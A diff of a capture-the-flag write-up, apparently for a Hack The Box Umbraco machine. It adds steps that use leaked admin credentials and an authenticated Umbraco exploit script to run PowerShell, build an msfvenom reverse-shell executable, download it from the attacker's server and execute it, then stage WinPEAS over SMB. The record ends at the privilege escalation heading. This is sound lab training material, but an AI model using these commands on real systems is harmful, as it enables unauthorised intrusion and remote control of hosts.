@@ -224,7 +224,7 @@ baconandcheese
 * admin@htb.local:baconandcheese
 * Navigate to the umbraco login page and login
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 * Here is where I asked myself the question "okay what can we do with our admin credentials in the Umbraco CMS?"
 
@@ -256,11 +256,15 @@ Finding a writeable directory:
 python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "ls C:/" 
 ```
 
+* We see ftp\_transfer
+
 Creating payload w/ msfvenom:
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe > rev.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe > shell-x64.exe
 ```
+
+* Must be a <mark style="color:yellow;">stageless payload</mark>
 
 Start nc listener:
 
@@ -271,11 +275,40 @@ nc -lnvp 1337
 Start HTTP server for file transfer:
 
 ```
+python3 -m http.server
 ```
+
+Transfer payload to target:
+
+```
+python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "-NoP Invoke-WebRequest -Uri 'http://10.10.16.2:8000/shell-x64.exe' -Outfile 'C:/ftp_transfer/shell-x64.exe'"
+```
+
+Detonate the reverse shell payload:
+
+```
+python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "C:/ftp_transfer/shell-x64.exe"
+```
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Shell</p></figcaption></figure>
 
 ## Privilege Escalation
 
 ### Local enumeration
+
+* The first thing that I do is run net use and add my SMB server to the target
+* Next, I load WinPEAS&#x20;
+
+```
+net use \\10.10.16.2\smb
+copy \\10.10.16.2\smb\winPEASx64.exe
+.\winPEASx64.exe
+```
+
+* Unfortunately, I could not find anything
+* After enumerating the file system, specifially Program Files (x86), I notice the TeamViewer is installed
+* I also noticed that it is running version 7 hence the directory name
+*
 
 ### PrivEsc vector
 
